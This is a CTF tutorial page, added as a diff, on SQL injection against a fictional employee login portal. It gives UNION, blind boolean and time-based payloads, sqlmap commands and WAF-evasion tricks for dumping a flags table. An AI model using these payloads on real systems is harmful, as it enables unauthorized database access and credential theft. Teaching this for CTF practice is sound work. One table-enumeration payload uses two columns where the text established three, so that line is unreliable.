@@ -1,0 +1,233 @@
+---
+title: "SQL Injection CTF Writeup: Database Extraction Techniques"
+sidebarTitle: "SQL Injection"
+description: "Step-by-step SQL injection CTF walkthrough covering UNION-based, blind boolean, and time-based extraction with sqlmap and manual payloads."
+---
+
+SQL injection remains one of the most rewarding vulnerability classes in web CTF competitions. A single unsanitized input can unravel an entire database, handing you table names, user credentials, and — almost always — the flag itself. This writeup walks through a realistic login-form challenge from reconnaissance to full database extraction, covering manual techniques and automated tooling so you understand both what's happening and how to do it faster under competition pressure.
+
+## Challenge Background
+
+The challenge presents a simple employee portal at `http://target.ctf/login`. You're given no source code — just the URL and the note: *"Only authorized employees may log in."*
+
+The login form accepts a username and password. A failed attempt returns **"Invalid credentials."** A successful one presumably returns a dashboard. Your goal is to extract the flag stored somewhere in the database.
+
+Initial observation: the application appears to be running PHP (notice the `.php` extension in redirects) with a MySQL backend (suggested by the `PHPSESSID` cookie and a brief error message you trigger in the next step).
+
+## Attack Flow
+
+<Steps>
+  <Step title="Discover the Injection Point">
+    Start by probing the username field with a single quote. Submit `'` as the username with any password.
+
+    ```http
+    POST /login HTTP/1.1
+    Host: target.ctf
+    Content-Type: application/x-www-form-urlencoded
+
+    user='&pass=test
+    ```
+
+    The application responds with a MySQL error:
+
+    ```
+    You have an error in your SQL syntax; check the manual that corresponds to your
+    MySQL server version for the right syntax to use near ''''' at line 1
+    ```
+
+    This confirms two things: the username parameter is directly interpolated into a SQL query without sanitization, and the backend is MySQL. The underlying query is almost certainly something like:
+
+    ```sql
+    SELECT * FROM users WHERE username = '$user' AND password = '$pass'
+    ```
+
+    You now have a confirmed injection point. Move on to authentication bypass as a proof of concept before going deeper.
+  </Step>
+
+  <Step title="Bypass Authentication">
+    Use a classic OR-based payload to short-circuit the WHERE clause. Enter the following as the username:
+
+    ```sql
+    ' OR '1'='1
+    ```
+
+    With any password, this transforms the query into:
+
+    ```sql
+    SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
+    ```
+
+    Because `'1'='1'` is always true, the query returns the first row in the users table and logs you in as that user. In many CTF challenges, this is enough — the dashboard shows the flag. Here, it shows a generic employee dashboard with no flag. You need to dig into the database itself.
+  </Step>
+
+  <Step title="Determine Column Count with UNION">
+    Before constructing a UNION-based payload, you need to know how many columns the original SELECT returns. Inject ORDER BY clauses with increasing numbers until the query breaks:
+
+    ```sql
+    ' ORDER BY 1--
+    ' ORDER BY 2--
+    ' ORDER BY 3--
+    ' ORDER BY 4--
+    ```
+
+    The query succeeds for 1, 2, and 3 but returns an error on 4. The original SELECT returns **3 columns**.
+
+    Now confirm which columns are reflected in the response by injecting NULL values:
+
+    ```sql
+    ' UNION SELECT NULL,NULL,NULL--
+    ```
+
+    The page loads without error. Replace NULLs with string markers to find which column positions appear in the rendered HTML:
+
+    ```sql
+    ' UNION SELECT 'col1','col2','col3'--
+    ```
+
+    The username field on the dashboard displays `col2`. Column 2 is your output channel.
+  </Step>
+
+  <Step title="Enumerate Databases and Tables">
+    Query the `information_schema` to list all databases:
+
+    ```sql
+    ' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
+    ```
+
+    The response cycles through multiple rows. You see: `information_schema`, `mysql`, `performance_schema`, and **`ctfdb`**. That last one is your target.
+
+    Now enumerate tables inside `ctfdb`:
+
+    ```sql
+    ' UNION SELECT table_name,NULL FROM information_schema.tables--
+    ```
+
+    <Note>
+      If the page only renders one row at a time, use `LIMIT` and `OFFSET` to paginate through results: `LIMIT 1 OFFSET 0`, `LIMIT 1 OFFSET 1`, and so on. Alternatively, use `GROUP_CONCAT` to collapse all values into a single cell: `SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema='ctfdb'`.
+    </Note>
+
+    Using `GROUP_CONCAT`:
+
+    ```sql
+    ' UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR ', '),NULL
+      FROM information_schema.tables
+      WHERE table_schema='ctfdb'--
+    ```
+
+    Result: `users, employees, flags`. The `flags` table is exactly what you want.
+  </Step>
+
+  <Step title="Extract the Flag">
+    Enumerate the columns in the `flags` table:
+
+    ```sql
+    ' UNION SELECT NULL,GROUP_CONCAT(column_name SEPARATOR ', '),NULL
+      FROM information_schema.columns
+      WHERE table_name='flags'--
+    ```
+
+    Result: `id, flag_value, solved_by`. Now dump the flag:
+
+    ```sql
+    ' UNION SELECT NULL,flag_value,NULL FROM ctfdb.flags LIMIT 1--
+    ```
+
+    The dashboard renders:
+
+    ```
+    CTF{un10n_1nj3ct10n_m4st3r_2024}
+    ```
+
+    Flag captured.
+  </Step>
+</Steps>
+
+## Manual vs Automated Approach
+
+The manual walkthrough above teaches you exactly what's happening at the SQL level. Under time pressure in a real competition, you'll often want to confirm the injection point manually and then hand off extraction to sqlmap.
+
+<CodeGroup>
+  ```sql Manual UNION Extraction
+  -- Step 1: Test injection
+  ' OR '1'='1
+
+  -- Step 2: Find column count
+  ' ORDER BY 3--
+
+  -- Step 3: Identify output column
+  ' UNION SELECT NULL,NULL,NULL--
+
+  -- Step 4: List databases
+  ' UNION SELECT NULL,schema_name,NULL
+    FROM information_schema.schemata--
+
+  -- Step 5: List tables in target DB
+  ' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL
+    FROM information_schema.tables
+    WHERE table_schema='ctfdb'--
+
+  -- Step 6: Dump flags table
+  ' UNION SELECT NULL,flag_value,NULL
+    FROM ctfdb.flags LIMIT 1--
+  ```
+
+  ```bash Automated with sqlmap
+  # Enumerate all databases
+  sqlmap -u "http://target.ctf/login" --data="user=admin&pass=test" --dbs
+
+  # Enumerate tables in ctfdb
+  sqlmap -u "http://target.ctf/login" --data="user=admin&pass=test" -D ctfdb --tables
+
+  # Dump the flags table
+  sqlmap -u "http://target.ctf/login" --data="user=admin&pass=test" -D ctfdb -T flags --dump
+  ```
+</CodeGroup>
+
+## Blind Boolean-Based Injection
+
+Not every challenge reflects output directly. When the application only returns true/false responses (e.g., "Login successful" vs "Invalid credentials"), you need blind injection to extract data one bit at a time.
+
+The technique works by asking the database yes/no questions through the query's truth value:
+
+```sql
+-- Is the first character of the first flag's ASCII value greater than 64?
+' AND (SELECT ASCII(SUBSTRING(flag_value,1,1)) FROM ctfdb.flags LIMIT 1) > 64--
+
+-- Is it greater than 80?
+' AND (SELECT ASCII(SUBSTRING(flag_value,1,1)) FROM ctfdb.flags LIMIT 1) > 80--
+
+-- Binary search converges: ASCII 67 = 'C'
+' AND (SELECT ASCII(SUBSTRING(flag_value,1,1)) FROM ctfdb.flags LIMIT 1) = 67--
+```
+
+Repeat for each character position. This is tedious by hand — automate it with a Python script or let sqlmap handle it with `--technique=B`.
+
+## Time-Based Blind Injection
+
+When the application returns identical responses regardless of query truth value (no visible difference), switch to time-based inference. A deliberate delay signals a "true" condition:
+
+```sql
+-- If the first character is 'C' (ASCII 67), sleep 5 seconds
+' AND IF(
+    (SELECT ASCII(SUBSTRING(flag_value,1,1)) FROM ctfdb.flags LIMIT 1) = 67,
+    SLEEP(5),
+    0
+  )--
+```
+
+If the response takes 5+ seconds, your condition is true. sqlmap handles this automatically with `--technique=T`.
+
+## WAF Bypass Techniques
+
+<Note>
+  Many CTF challenges — and all real-world targets — deploy Web Application Firewalls that block obvious SQLi strings like `UNION SELECT` or `OR 1=1`. Common bypass strategies include: using inline comments to break up keywords (`UN/**/ION SEL/**/ECT`), switching case (`uNiOn SeLeCt`), URL double-encoding (`%2527` for a quote), using equivalent syntax (`||` instead of `OR`, `&&` instead of `AND`), and substituting banned functions with equivalents (`MID()` instead of `SUBSTRING()`). sqlmap's `--tamper` scripts automate many of these transformations — try `--tamper=space2comment,between,randomcase` as a starting combination.
+</Note>
+
+## Key Takeaways
+
+- **Always probe with a single quote first.** The error message alone tells you the database type, which determines your syntax.
+- **Determine column count before UNION injection.** Mismatched column counts cause query errors, not useful output.
+- **`information_schema` is your map.** Every MySQL database exposes it — schemata, tables, and columns are always enumerable this way.
+- **Use `GROUP_CONCAT` to collapse multi-row results** into a single output when you only have one display column.
+- **Learn the manual technique before relying on sqlmap.** When sqlmap fails or is too slow, you need to understand what it's doing to adapt your approach.
+- **Blind injection is slower but just as powerful.** If you can't see output, you can still extract every byte — it just takes more requests.
